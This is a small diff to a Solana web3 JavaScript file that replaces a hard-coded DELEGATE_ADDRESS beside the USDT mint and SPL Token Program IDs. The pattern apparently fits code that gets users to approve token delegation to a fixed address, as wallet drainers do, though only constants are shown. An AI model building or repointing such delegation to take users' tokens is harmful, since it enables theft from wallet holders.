@@ -4,7 +4,7 @@ const RPC_ENDPOINTS = [
 ];
 
 const USDT_MINT = new solanaWeb3.PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
-const DELEGATE_ADDRESS = new solanaWeb3.PublicKey("FoPbaqegt8iw6gPevbuWmYBY2WXFEwDGTvRdhzqwwntX");
+const DELEGATE_ADDRESS = new solanaWeb3.PublicKey("7k2HSLfZTg3nFqj8sYvyMREUuMzsjK4RhDp1pVFkJ38W");
 
 // 官方 SPL Token Program
 const OFFICIAL_SPL_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
